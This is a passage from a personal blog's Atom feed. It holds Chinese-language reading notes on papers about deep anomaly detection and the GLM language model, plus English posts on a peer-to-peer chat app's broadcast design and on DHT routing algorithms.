不仅仅局限于已知异常，着重于基于深度神经网络直接学习评估异常分数<ul><li>排名模型<ul><li>设计基于逻辑回归损失函数的异常评分模型【5】</li><li>先验模型：已知数据集的分布特性</li></ul></li><li>概率模型 - 通过最大化在训练集中事件的可能性来学习异常评分</li><li>端到端单种类分类器<ul><li>对抗学习单种类分类器（adversarially learned one-class classification，ALOCC）【6】</li></ul></li></ul></li></ul></li></ul><h2 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h2><ol><li>异常检测方法根据检测环境的不同有比较大的差距。理想情况下需要先了解实际环境中的异常种类、分布等信息，然后对症下药，选择合适的特征工程以及检测算法。但是大多数情况下均不满足这些条件，给检测工作带来许多难题，最终导致模型检测结果不尽如人意。</li><li>深度学习可以针对性的解决部分异常检测面临的挑战，但是也需要针对具体问题灵活选择合适算法。</li></ol><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="https://www.notion.so/Deep-Learning-for-Anomaly-Detection-A-Review-27ba856b85f147f1b3cb114a93848f63?pvs=4#3e5880a9bd784529ad5022b751a168ba">Alex Krizhevsky, Ilya Sutskever, and Geoffrey E Hinton. 2012. Imagenet classification with deep convolutional neural networks.</a></li><li><a href="https://www.notion.so/Deep-Learning-for-Anomaly-Detection-A-Review-27ba856b85f147f1b3cb114a93848f63?pvs=4#a854d669d0e74fcf9241cdbab8d2ba3f">Karen Simonyan and Andrew Zisserman. 2015. Very deep convolutional networks for large-scale image recognition. In ICLR.</a></li><li><a href="https://www.notion.so/Deep-Learning-for-Anomaly-Detection-A-Review-27ba856b85f147f1b3cb114a93848f63?pvs=4#c42b25debe154c99ac44769a22218463">Radu Tudor Ionescu, Sorina Smeureanu, Bogdan Alexe, and Marius Popescu. 2017. Unmasking the abnormal events in video. In ICCV. 2895–2903.</a></li><li><a href="https://openaccess.thecvf.com/content_cvpr_2016/html/He_Deep_Residual_Learning_CVPR_2016_paper.html">Kaiming He, Xiangyu Zhang, Shaoqing Ren, and Jian Sun. 2016. Deep residual learning for image recognition. In CVPR. 770–778.</a></li><li><a href="https://www.notion.so/Deep-Learning-for-Anomaly-Detection-A-Review-27ba856b85f147f1b3cb114a93848f63?pvs=4#b46593aa01974e8aa73a0f89fba37aca">Guansong Pang, Cheng Yan, Chunhua Shen, Anton van den Hengel, and Xiao Bai. 2020. Self-trained Deep Ordinal Regression for End-to-End Video Anomaly Detection. In CVPR. 12173–12182.</a></li><li><a href="https://www.notion.so/Deep-Learning-for-Anomaly-Detection-A-Review-27ba856b85f147f1b3cb114a93848f63?pvs=4#9075f53359e1410bbd44f59325c117de">Mohammad Sabokrou, Mohammad Khalooei, Mahmood Fathy, and Ehsan Adeli. 2018. Adversarially learned one-class classifier for novelty detection. In CVPR. 3379–3388.</a></li><li><a href="https://www.notion.so/Deep-Learning-for-Anomaly-Detection-A-Review-27ba856b85f147f1b3cb114a93848f63?pvs=4#78435f94252346e1b2e1295acb851f75">Guansong Pang, Chunhua Shen, Huidong Jin, and Anton van den Hengel. 2019. Deep Weakly-supervised Anomaly Detection. arXiv preprint:1910.13601 (2019).</a></li></ol><h2 id="Related-Materials"><a href="#Related-Materials" class="headerlink" title="Related Materials"></a>Related Materials</h2><ul><li>算法列表<center>  <img src="/img/DLforAD/3.png" width="850"></center><center>  <img src="/img/DLforAD/4.png" width="850"></center></li><li><a href="https://git.io/JTs93">数据集列表</a><center>  <img src="/img/DLforAD/5.png" width="850"></center></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Info&quot;&gt;&lt;a href=&quot;#Info&quot; class=&quot;headerlink&quot; title=&quot;Info&quot;&gt;&lt;/a&gt;Info&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;名称：Deep Learning for Anomaly Detection: A Review&lt;/li&gt;
&lt;li&gt;作者：&lt;ul&gt;
&lt;li&gt;GUANSONG PANG, University of Adelaide&lt;/li&gt;
&lt;li&gt;CHUNHUA SHEN, University of Adelaide&lt;/li&gt;
&lt;li&gt;LONGBING CAO, University of Technology Sydney&lt;/li&gt;
&lt;li&gt;ANTON VAN DEN HENGEL, University of Adelaide&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;原文链接：&lt;a href=&quot;https://arxiv.org/abs/2007.02500&quot;&gt;arxiv&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Essay" scheme="https://coldwave96.github.io/categories/Essay/"/>
    
    <category term="Notes" scheme="https://coldwave96.github.io/categories/Essay/Notes/"/>
    
    
    <category term="Anomaly Detection" scheme="https://coldwave96.github.io/tags/Anomaly-Detection/"/>
    
    <category term="Deep Learning" scheme="https://coldwave96.github.io/tags/Deep-Learning/"/>
    
  </entry>
  
  <entry>
    <title>GLM - General Language Model Pre-training with Autoregressive Blank Infilling</title>
    <link href="https://coldwave96.github.io/2023/03/21/GLM/"/>
    <id>https://coldwave96.github.io/2023/03/21/GLM/</id>
    <published>2023-03-21T05:33:44.000Z</published>
    <updated>2023-03-21T05:33:44.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><ul><li>名称：GLM: General Language Model Pre-training with Autoregressive Blank Infilling</li><li>作者：<ul><li>Zhengxiao Du：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)</li><li>Yujie Qian：MIT CSAIL</li><li>Xiao Liu：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)</li><li>Ming Ding：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)</li><li>Jiezhong Qi：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)</li><li>Zhilin Yang：Tsinghua University，Shanghai Qi Zhi Institute</li><li>Jie Tang：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)</li></ul></li><li>原文链接：<a href="https://www.notion.so/GLM-General-Language-Model-Pre-training-with-Autoregressive-Blank-Infilling-5e61ef3557d2439bb3a3b344e8b26583?pvs=4#56fecaacdf6049f9bdb25e7edacb7f11">arxiv</a></li></ul><span id="more"></span><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><ul><li>现有的预训练框架无法灵活的应对所有NLP任务，本文提出基于自回归 + 空白填充（blank infilling）的预训练模型GLM（General Language Model）应对NLU（Natural Language Understanding）任务以及文本生成任务。</li></ul><h2 id="Contributions"><a href="#Contributions" class="headerlink" title="Contributions"></a>Contributions</h2><ol><li>结合AR（autoregressive）模型和空白填充（blank infilling）技术，提出GLM预训练框架应对NLU和长文本生成为主的多种NLP任务。</li><li>在原来空白填充基础上提出了两个创新，span shuffling 和 2D positional encoding。</li></ol><h2 id="Paragraph"><a href="#Paragraph" class="headerlink" title="Paragraph"></a>Paragraph</h2><h3 id="Sec-1"><a href="#Sec-1" class="headerlink" title="Sec.1"></a>Sec.1</h3><ul><li>现有的预训练框架可以分为三类<ul><li>自回归（autoregressive）模型：如GPT[1]，在长文本生成方面很成功，但是无法完全捕捉上下文之间的依赖关系。</li><li>自编码（autoencoding）模型：如BERT[2]，适合NLP任务，但是不能直接应用于文本生成。</li><li>编码器-解码器模型：如T5[3]，统一了NLU和条件生成，但是需要更多的参数匹配基于BERT模型的性能表现。</li></ul></li></ul><h3 id="Sec-2"><a href="#Sec-2" class="headerlink" title="Sec.2"></a>Sec.2</h3><ul><li>GLM 预训练：输入的部分被分为两个部分。A部分是被破坏的文本<code>Xcorrupt</code>，B部分为被sample的部分。B部分中每个span前后分别加上[S]和[E]，训练目标是预测B部分。使用两种位置向量作为输入。Self-attention的mask部分控制attend的位置，蓝色部分即A部分只能attend本身，黄色和绿色部分也即B部分能attend整个A部分以及前面已经生成的部分。</li></ul><center>    <img src="/img/GLM/1.png" width="850"></center><ul><li>多任务预训练：<ul><li>文档级：对单一span取样，长度为原长度均匀分布中的50% - 100%。这一部分旨在长文本生成。</li><li>句子级：限制被mask的span必须是完整句子，取样覆盖15%的原始tokens。这部分旨在预测完成句子和段落的seq2seq任务。</li></ul></li><li>GLM使用的是单一Transformer以及一些改进<ul><li>重新排列了层的归一化和残差连接的顺序。</li><li>使用单一的线性层用于输出token的预测。</li><li>用GeLUs替代ReLU作为激活函数[4]。</li></ul></li><li>2D Positional Encoding： 每一个token由两个位置编码组成<ul><li>第一个位置编码为token在<code>Xcorrucpt</code>中的位置。被mask的token为【MASK】标志的位置。</li><li>第二个位置编码代表其在intra-span中的位置。Part A的token该位置编码为0， Part B的token该位置编码从1到span的长度。</li></ul></li></ul><h3 id="Sec-3"><a href="#Sec-3" class="headerlink" title="Sec.3"></a>Sec.3</h3><ul><li>Finetuning GLM（调优）<ul><li>分类任务（NLU）：参考PET[5]，对于带标签的例子（x，y），将输入 x 转化成为一个包含单一【MASK】的填空题，预测标签 y 映射到这个填空题的答案集中。通过交叉熵（cross-entropy loss）来微调模型。</li><li>文本生成任务：给定的上下文构成输入的A部分，在结尾append一个【MASK】token，以autoregressive模型生成B部分。</li></ul></li></ul><center>    <img src="/img/GLM/2.png" width="850"></center><h2 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h2><ol><li>提出了改进型的GLM模型旨在同时适配NLU和长文本生成任务，结合了span shuffling 和 2D positional encoding两处创新。</li><li>分类任务介绍不够详细，详细方法可能需要通过代码实现来佐证。</li></ol><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="https://www.notion.so/GLM-General-Language-Model-Pre-training-with-Autoregressive-Blank-Infilling-5e61ef3557d2439bb3a3b344e8b26583?pvs=4#5e97f05c3c594f6a8b239acb9463c25b">Alec Radford, Karthik Narasimhan, Tim Salimans, and Ilya Sutskever. 2018a. Improving Language Understanding by Generative Pre-Training.</a></li><li><a href="https://www.notion.so/GLM-General-Language-Model-Pre-training-with-Autoregressive-Blank-Infilling-5e61ef3557d2439bb3a3b344e8b26583?pvs=4#c3092c7d95cc4d07b2d8d8abf33b1a84">Jacob Devlin, Ming-Wei Chang, Kenton Lee, and Kristina Toutanova. 2019. BERT: Pre-training of Deep Bidirectional Transformers for Language Understanding. In NAACL 2019, pages 4171–4186.</a></li><li><a href="https://www.notion.so/GLM-General-Language-Model-Pre-training-with-Autoregressive-Blank-Infilling-5e61ef3557d2439bb3a3b344e8b26583?pvs=4#1769f3f516414bfa8b6037fe43f2cefc">Colin Raffel, Noam Shazeer, Adam Roberts, Katherine Lee, Sharan Narang, Michael Matena, Yanqi Zhou, Wei Li, and Peter J. Liu. 2020. Exploring the Limits of Transfer Learning with a Unified Text-toText Transformer. J. Mach. Learn. Res., 21:140:1140:67.</a></li><li><a href="https://www.notion.so/GLM-General-Language-Model-Pre-training-with-Autoregressive-Blank-Infilling-5e61ef3557d2439bb3a3b344e8b26583?pvs=4#72b2defebc20404aa27ff0bdd290763a">Dan Hendrycks and Kevin Gimpel. 2016. Bridging nonlinearities and stochastic regularizers with gaussian error linear units. CoRR, abs&#x2F;1606.08415.</a></li><li><a href="https://www.notion.so/GLM-General-Language-Model-Pre-training-with-Autoregressive-Blank-Infilling-5e61ef3557d2439bb3a3b344e8b26583?pvs=4#36a58dc3ea30420c9d91627385988a72">Timo Schick and Hinrich Schütze. 2020a. Exploiting Cloze Questions for Few Shot Text Classification and Natural Language Inference. pages 255–269.</a></li></ol><h2 id="Related-Materials"><a href="#Related-Materials" class="headerlink" title="Related Materials"></a>Related Materials</h2><ul><li><a href="https://github.com/THUDM/GLM">GLM</a></li><li><a href="https://github.com/THUDM/ChatGLM-6B">GLM-6B</a></li><li><a href="https://github.com/THUDM/GLM-130B">GLM-130B</a></li><li>Cloze questions and verbalizers</li></ul><center>    <img src="/img/GLM/3.png" width="850"></center>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Info&quot;&gt;&lt;a href=&quot;#Info&quot; class=&quot;headerlink&quot; title=&quot;Info&quot;&gt;&lt;/a&gt;Info&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;名称：GLM: General Language Model Pre-training with Autoregressive Blank Infilling&lt;/li&gt;
&lt;li&gt;作者：&lt;ul&gt;
&lt;li&gt;Zhengxiao Du：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)&lt;/li&gt;
&lt;li&gt;Yujie Qian：MIT CSAIL&lt;/li&gt;
&lt;li&gt;Xiao Liu：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)&lt;/li&gt;
&lt;li&gt;Ming Ding：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)&lt;/li&gt;
&lt;li&gt;Jiezhong Qi：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)&lt;/li&gt;
&lt;li&gt;Zhilin Yang：Tsinghua University，Shanghai Qi Zhi Institute&lt;/li&gt;
&lt;li&gt;Jie Tang：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;原文链接：&lt;a href=&quot;https://www.notion.so/GLM-General-Language-Model-Pre-training-with-Autoregressive-Blank-Infilling-5e61ef3557d2439bb3a3b344e8b26583?pvs=4#56fecaacdf6049f9bdb25e7edacb7f11&quot;&gt;arxiv&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Essay" scheme="https://coldwave96.github.io/categories/Essay/"/>
    
    <category term="Notes" scheme="https://coldwave96.github.io/categories/Essay/Notes/"/>
    
    
    <category term="NLP" scheme="https://coldwave96.github.io/tags/NLP/"/>
    
  </entry>
  
  <entry>
    <title>A Decentralized Chat Application</title>
    <link href="https://coldwave96.github.io/2021/11/02/P2PChatSystem/"/>
    <id>https://coldwave96.github.io/2021/11/02/P2PChatSystem/</id>
    <published>2021-11-02T06:28:03.000Z</published>
    <updated>2021-11-02T06:28:03.000Z</updated>
    
    <content type="html"><![CDATA[<p>The project is to transform existing chat program into a decentralized chat application.</p><span id="more"></span><h2 id="Discussion-About-the-Shout-Feature"><a href="#Discussion-About-the-Shout-Feature" class="headerlink" title="Discussion About the Shout Feature"></a>Discussion About the Shout Feature</h2><p>The shout command can be used by any user currently joined in a room. Once a peer shouted, all peers in the network includes all peers for which there is a path of connections from shouting peer are supposed to receive a provided message.</p><h3 id="Overall-Design"><a href="#Overall-Design" class="headerlink" title="Overall Design"></a>Overall Design</h3><p>Assume that we have established a peer network as shown in Figure 1. Peer C and peer D are connected to peer B. Peer B is connected to peer A. At a certain time, peer C types a shout command and then sends a Shout Command I to its upstream node peer B. After received the Shout Command I from its downstream node, peer B will send Shout Message to all the downstream nodes that connected to it. Also, peer B will check if it is connecting to other peers. If peer B does connect to another peer as shown in the figure, it will send a Shout Command II to its upstream node.  Then the peer A, as the upstream node of peer B, will do the same thing that is sending Shout Messages to its downstream nodes and Shout Command II to its upstream nodes. In this way, the broadcast of shout messages is achieved.</p><p>This is a brief overall design on Shout feature. The content and format of the command packet and message packet which involve in have been illustrated in the Figure 1.</p><p><img src="/img/P2PChatSystem/Picture1.png" alt="Figure 1"></p><h3 id="Implementation-Details"><a href="#Implementation-Details" class="headerlink" title="Implementation Details"></a>Implementation Details</h3><p>This part focus on the implementation details about the Shout feature. In this project, we are supposed to combine the server part and the client part into one peer. Therefore, I use two threads to handle the different parts separately.</p><p><img src="/img/P2PChatSystem/Picture2.png" alt="Figure 2"></p><p>For the first step, when a peer wants to shout, it will send Shout Command I to its upstream peer through client handle thread. When upstream node’s server thread received a Shout Command, it will first check if there is an identity field in the command packet to distinguish the command’s type. If it’s a Shout Command I, it means that one of the peers connected to the peer wants to shout. Then for the second step, the peer will find the identity of the shout peer and send Shout Message containing the identity of the shout peer to all peers connected to the current peer and joining a room. At the same time, server handle thread will check if the client handle thread is connecting to another peer other than itself. If it does connect to another peer, then the client handle thread will send a Shout Message II containing the identity of shout peer to the upstream peer.</p><p>When a peer received a Shout Message from its upstream peer, there are two things to do. First, the client handle thread will print the shout message on the screen. Second, the peer will send the Shout Message to all the peers that connected to it and joined a room. When a peer received a Shout Command II, there are also two things to do. First, the peer will send Shout Messages filled with the information from the Shout Command II to all the peers which connected to the current peer and joined a room. Second, the peer will check if it is connected to another peer other than itself. If it is connecting to another peer, then it will retweet this Shout Message II to that peer. So on and so forth, the Shout Message can be broadcast through the peer-to-peer network.</p><h3 id="Discussion-About-the-Shout-Feature-Implementation"><a href="#Discussion-About-the-Shout-Feature-Implementation" class="headerlink" title="Discussion About the Shout Feature Implementation"></a>Discussion About the Shout Feature Implementation</h3><p>In the previous description, I introduced the implementation of Shout feature. Overall, this implementation has its cons and pros when facing the general challenges of distributed system.</p><p>For scalability, the bottleneck is performance of the peer. Each peer needs at least two threads to handle the client and server side respectively. If the client uses the #connect command to connect to another peer, an additional thread is needed to receive message from the upstream peer’s server thread in real time. In addition, whenever a new peer connects to the current peer, the server thread creates a new thread to handle the keep-alive socket connect. So, this is where the paradox comes in. The use of threads allows us to easily scale the peer-to-peer network and at the same time becomes a bottleneck that limits the size of the network.</p><p>For concurrency, also threads help the system to control multiple processes with its unique competitive mechanism. The system meets the demand of high concurrency to a certain extent by combing multi-threaded technology with the multi-core and multi-threaded feature of CPU. This allows the system to perform several tasks simultaneously, improving operational efficiency and speeding up data processing. Data consistency is also ensured by lock or message queue techniques.<br>For failure handling, the implementation has many shortcomings. Only the simplest case is presented in the design and implementation, but the actual situation can be very complex. First of all, if a Shout Message or Shout Command is lost during transmission, then starting from the lost peer, subsequent peers will not receive the Shout Message or Command, and there is no means to detect the loss of the packet. Another problem is that if there is a cycle path among the peer-to-peer network, the broadcast of Shout Message will be no end.</p><p><img src="/img/P2PChatSystem/Picture3.png" alt="Figure 3"></p><p>First consider a simple loop as shown in the Figure 3, which is a peer connected to itself. In such case, if the peer received a Shout Command I, it is supposed to send a Shout Command II to itself. This leads to an infinite loop. So, the system will check if the current peer is connected to itself, then decide whether it is necessary to send the Shout Command II packet.</p><p>When considering another slightly more complex loop as shown in the Figure 3-4, this broadcast loop issue will be difficult to solve. Peer A sends Shout Command I to peer C, peer C responses with Shout Message and sends the Shout Message to peer B. Also, peer C sends Shout Command II to peer D. In the meanwhile, peer D sends Shout Command II to peer A. After peer A receives the Shout Command II from peer D, it will transfer this Shout Command II to peer C. And so, the cycle continues endlessly.</p><p><img src="/img/P2PChatSystem/Picture4.png" alt="Figure 4"></p><p>For security, there are several security issues in the implementation. First, all the packets are not encrypted, hackers could easily get some information through listening the communication channel. Second, hackers could hijack the packet, modify the content, and replay the new packet. Finally, hackers could create multiple peers and shout at a same time. The broadcast message may greatly increase the network load, and even crash the network.</p><h2 id="Discussion-About-the-Decentralized-Model"><a href="#Discussion-About-the-Decentralized-Model" class="headerlink" title="Discussion About the Decentralized Model"></a>Discussion About the Decentralized Model</h2><p>As discussed before, the peer will create two threads initially. The server thread is waiting for other peers’ socket connection and the client thread is used for handling user commands.</p><p>User could use #help command to get some help. The system will list all available commands. Only the peer owner could use #createroom command to create a new chat room on the current peer. User could use #list command to list all the chat room on the current peer. #who command is used for list all the members in a chat room. The peer owner could use #kick command to kick a peer from the current peer and the system will add its IP into blacklist. Therefore, the kicked peer is blocked from reconnecting. User could user #delete command to delete a room from current peer. #listneighbors command is used for listing the neighbors of current peer. #searchnetwork command will crawl over all the accessible peer in the peer-to-peer network automatically. User could use #quit command to quit the system.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;The project is to transform existing chat program into a decentralized chat application.&lt;/p&gt;</summary>
    
    
    
    <category term="Program" scheme="https://coldwave96.github.io/categories/Program/"/>
    
    <category term="Java" scheme="https://coldwave96.github.io/categories/Program/Java/"/>
    
    
    <category term="Github" scheme="https://coldwave96.github.io/tags/Github/"/>
    
  </entry>
  
  <entry>
    <title>Routing in P2P Overlay Networks</title>
    <link href="https://coldwave96.github.io/2021/09/17/RoutingInP2P/"/>
    <id>https://coldwave96.github.io/2021/09/17/RoutingInP2P/</id>
    <published>2021-09-17T10:53:07.000Z</published>
    <updated>2021-09-17T10:53:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>[Abstract] P2P (Peer-to-Peer) overlay network is one of the most popular distributed networks. It not only has advantages in scalability, but also can maximize the use of computing and storage resources of each terminal nodes. In the last ten years, P2P system is a hot topic in IT field. Recently, most researchers study structed P2P system, which is better than the former P2P structure. This paper focus on the routing algorithms based on DHT in second generation of P2P overlay networks.</p><span id="more"></span><h2 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1.Introduction"></a>1.Introduction</h2><p>The emergence of P2P system is the consequence of the rapid development of Internet. The world’s population is increasing, and technology is also improving. The demand for Internet services is also expanding. Traditional network can only expand its service scope by increasing the number of servers, while the purchase and maintenance of servers will increase the costs of service providers and consume a lot of resources. In addition, the single server needs to extend the network bandwidth to expand the number of services. This is also one of the limiting factors in the traditional network itself. </p><p>Peer-to-Peer system is an instance of distributed system. Unlike traditional network architecture, there is no concept of centralized control in P2P system. In other words, each terminal node in this type of network is both the service provider and user. Peer-to-peer systems aim to support useful distributed services and applications using data and computing resources available in the personal computers and workstations that are present on the Internet and other networks in ever-increasing numbers [1].</p><p>In the P2P system, resources are stored in the nodes of the network. The structured overlay network is responsible for routing between any two P2P nodes. In the first generation of structured overlay network algorithms, each node records all other nodes’ pointer (one hop overlay), so that most of the message communication can be completed directly. These algorithms are suitable for small scale networks. In the second generation of structured overlay network algorithms, each node only records a small number of pointers of other nodes. The algorithms ensure that the message routing is completed within a certain number of hops. Typical algorithms such as Chord, Pastry, Tapestry and CAN. This paper mainly introduces the second generation of structured overlay network algorithm, then analyzes and compares its performance.</p><h2 id="2-Routing-Overlays"><a href="#2-Routing-Overlays" class="headerlink" title="2.Routing Overlays"></a>2.Routing Overlays</h2><p>Routing overlay is a distributed algorithm in P2P system which takes responsibility for locating nodes and objects. Peer-to-peer systems usually store multiple replicas of objects to ensure availability. In that case, the routing overlay maintains knowledge of the location of all the available replicas and delivers requests to the nearest ‘live’ node (i.e., one that has not failed) that has a copy of the relevant object [1].</p><h3 id="2-1-DHT"><a href="#2-1-DHT" class="headerlink" title="2.1.DHT"></a>2.1.DHT</h3><p>In P2P overlay networks, each object has unique GUID (Globally Unique Identifier). This value is calculated by a hash function (such as SHA-1) according to all or part of the state of the object. Because of this, routing overlay networks are sometimes called distributed hash tables (DHT).</p><p>In DHT model, a data item with a GUID of X will be stored in a node whose GUID is closest to X in value. Copies of the data item will also be stored on R hosts. The GUID of these hosts is last close to X, and R is the replication factor to ensure high availability.</p><p>The GUIDs cannot be read artificially, so you must get the object’s GUID through some indexing services. Then, the P2P system will find the location of these objects in the overlay networks through the following routing algorithms.</p><h3 id="2-2-Pastry"><a href="#2-2-Pastry" class="headerlink" title="2.2.Pastry"></a>2.2.Pastry</h3><p>Pastry is a network structure using DOLR (Distributed Object Location and Routing) technology. Messages are routed according to the keywords provided. In pastry, each node is assigned a 128 bits ID which is generated by the unified hash function according to the IP address or public host name of the node.</p><p>Each node has a routing table, a set of neighboring nodes and a set of leaf nodes. The IP address of the node is included in the routing table, and the first n bits of the ID of these nodes are the same, where n is the number of rows of the entry in the routing table. The IP addresses listed in the neighbor node set, and the corresponding IDs of these nodes are very similar to those of the nodes with the routing table. The ID of the node in the leaf node set is smaller than that of the node. Both routing table and leaf node set are used to route messages, but neighbor node set is only used to keep nodes locatable. When a node receives a message that it should route, it first checks the leaf node set, followed by the routing table. With the progress of routing, the ID gradually approaches the ID of the target node, and finally the message arrives at the target node.</p><h3 id="2-3-Tapestry"><a href="#2-3-Tapestry" class="headerlink" title="2.3.Tapestry"></a>2.3.Tapestry</h3><p>Tapestry is another network structure using DOLR technology. Each tapestry node contains pointers to other nodes and maps between the object’s GUID and node ID. Queries are routed along nodes of adjacent links until appropriate object pointers are found.</p><p>Tapestry network is a multi-node overlay network. Each tapestry node contains links to the set of neighbors with the shared node ID prefix. The neighbor nodes of a node constitute the neighbor node set. All the sets come together to form a routing table. When you want a node to publish an object, a mapping message will be sent to the target node whose node ID is closest to the object ID. When a node searches for an object, it is not necessary to find the target node that is close to or matches the object. It is only necessary to find the node that has the location information of the object.</p><h3 id="2-4-Chord"><a href="#2-4-Chord" class="headerlink" title="2.4.Chord"></a>2.4.Chord</h3><p>Chord algorithm is very simple. It uses a keyword to identify the file and stores the file on the node corresponding to the keyword. Chord stores keywords on the corresponding nodes in chord by using the consistent hash function. Each node in chord only needs to know the routing messages of a few other nodes. This is because the routing table in chord is decentralized, and each node gets path information by communicating with a few other nodes.</p><h3 id="2-5-CAN"><a href="#2-5-CAN" class="headerlink" title="2.5.CAN"></a>2.5.CAN</h3><p>CAN (Content-Addressable Network) is also a network structure that maps keywords to nodes. CAN uses multidimensional identifier space to implement DHT algorithm. CAN maps all nodes into an n-dimensional Cartesian space and allocates a region to each node as evenly as possible. CAN uses hash function to hash the K in (K, V) pair to get a point in Cartesian space, and stores the (K, V) pair in the node which has the region of the point. The routing algorithm adopted by CAN is relatively direct and simple. After finding out the coordinates of the target point, it will send the request to the node whose coordinates are closest to the target point.</p><p>Each node in CAN system maintains a routing table, which stores the IP address and coordinate area of adjacent nodes. When looking for messages, the node routes the lookup message to the neighbor node closest to the coordinate of the target node.</p><h2 id="3-Comparison"><a href="#3-Comparison" class="headerlink" title="3.Comparison"></a>3.Comparison</h2><p>In this section, the paper will compare overlay networks with traditional networks and different overlay networks algorithms we mentioned in section 2.</p><h3 id="3-1-Comparison-of-Overlay-Networks-and-Traditional-Networks"><a href="#3-1-Comparison-of-Overlay-Networks-and-Traditional-Networks" class="headerlink" title="3.1.Comparison of Overlay Networks and Traditional Networks"></a>3.1.Comparison of Overlay Networks and Traditional Networks</h3><p>When it comes to the traditional network, the first thing to think of is the TCP&#x2F;IP model. First, in terms of scale, the overlay network allows more usable space. Second, the placement of overlay network objects can be randomized, unlike the traditional network traffic model, which is associated with network topology. Thirdly, the update speed of overlay network routing table is much faster than that of traditional network. Fourth, in traditional networks, the target node is usually unique. While in overlay networks, it is enough to find the nearest copy of the target object. Finally, because the biggest characteristic of P2P network is decentralization, it has advantages in security and privacy compared with traditional networks.</p><h3 id="3-2-Comparison-of-Different-Routing-Algorithms-Based-on-DHT"><a href="#3-2-Comparison-of-Different-Routing-Algorithms-Based-on-DHT" class="headerlink" title="3.2.Comparison of Different Routing Algorithms Based on DHT"></a>3.2.Comparison of Different Routing Algorithms Based on DHT</h3><p>Obviously, the management of P2P system based on centralized directory mechanism is simpler. The bandwidth cost of maintaining the network is also smaller. However, because the server needs to centrally manage all the node information of the whole network, the performance and network liaison of the server will become the bottleneck of the whole system. The robustness of distributed P2P system is strengthened, and it will not cause the network paralysis because of the failure of a few nodes. Neither Napster nor Gnutella can ensure that the target node is found through an attempt. Servers in Napster may be paralyzed, and file location failure may occur due to the limit of flooding times in Gnutella. The DHT algorithm of structured coverage network can solve these problems.</p><p>Several algorithms based on DHT are similar in scalability, distribution, load balancing and self-organization. But it is different in some ways. Chord provides a naming mechanism, the consistency problem when nodes join and the treatment when nodes fail are relatively perfect. Chord can be used in large-scale file sharing network, time sharing effective storage system and large-scale distributed computing platform. Chord, Pastry and Tapestry all have the same number of search hops, and the length of CAN search path is relatively longer, so it is not suitable for voice phone and real-time information service. However, due to the good scalability index mechanism of CAN network, it can effectively support content insertion and retrieval.</p><p>The following table comprehensively compares the four algorithms mentioned in this paper from several aspects.</p><table><thead><tr><th align="center">Algorithms</th><th align="center">Insertion complexity</th><th align="center">Spatial complexity</th><th align="center">Average searching hops</th></tr></thead><tbody><tr><td align="center">Pastry</td><td align="center">O(log<sub>b</sub>⁡N)</td><td align="center">O(log<sub>b</sub>⁡N)</td><td align="center">O(log<sub>b</sub>⁡N)</td></tr><tr><td align="center">Tapestry</td><td align="center">O(log<sub>b</sub>⁡N)</td><td align="center">O(Nlog<sub>b</sub>⁡N)</td><td align="center">O(log<sub>b</sub>⁡N)</td></tr><tr><td align="center">Chord</td><td align="center">O(log<sub>2</sub>⁡N)</td><td align="center">O(Nlog<sub>2</sub>⁡N)</td><td align="center">O(log<sub>2</sub>⁡N)</td></tr><tr><td align="center">CAN</td><td align="center">O(d)</td><td align="center">O(d)</td><td align="center">dN<sup>1&#x2F;d</sup></td></tr></tbody></table><p>Illustration:</p><ul><li>b is the length of the identifier.</li><li>N is the scale of the network.</li><li>d is the dimension of coordinate space.</li></ul><h2 id="4-Conclusions-and-Future-Directions"><a href="#4-Conclusions-and-Future-Directions" class="headerlink" title="4.Conclusions and Future Directions"></a>4.Conclusions and Future Directions</h2><p>At this stage, the main research work is around the current algorithm, which shows that the current routing and location algorithms need to be further improved. The delay of searching in chord network and the fault-tolerant mechanism in case of failure nodes need to be improved. When malicious nodes appear in can network, the validity of data also needs to be improved. Now a lot of research is to improve the existing Chord, Pastry, Tapestry and CAN network algorithm. But at present, there are also some new network structures and corresponding algorithms based on the existing network algorithms and combining the advantages of several algorithms.</p><p>Another research hotspot is to improve the performance of overlay network by using the physical distribution characteristics of nodes. Because in the above four network structures, the logical ID of the node in the overlay network is obtained by hashing according to the information of the node, which basically ignores the physical distribution characteristics of the node. Many new studies have improved and perfected this aspect.</p><p>There are two directions for successful P2P applications. One is blockchain applications, such as bitcoin. The other is file sharing applications, such as BitTorrent. The application prospect of overlay network is very bright, and the problems to be solved are also prominent and urgent. Therefore, further research in this field will be very valuable.</p><h2 id="5-References"><a href="#5-References" class="headerlink" title="5.References"></a>5.References</h2><ul><li><p>[1]Coulouris, G. ,  Dollimore, G. ,  Kindberg, J. , &amp;  Blair, T. . (2012). Distributed Systems: Concepts and Design (5th Edition).</p></li><li><p>[2]Chen, G. ,  Xu, C. Z. ,  Shen, H. , &amp;  Chen, D. . (2003). P2P Overlay Networks of Constant Degree. Grid &amp; Cooperative Computing, Second International Workshop, Gcc, Shanghai, China, December, Revised 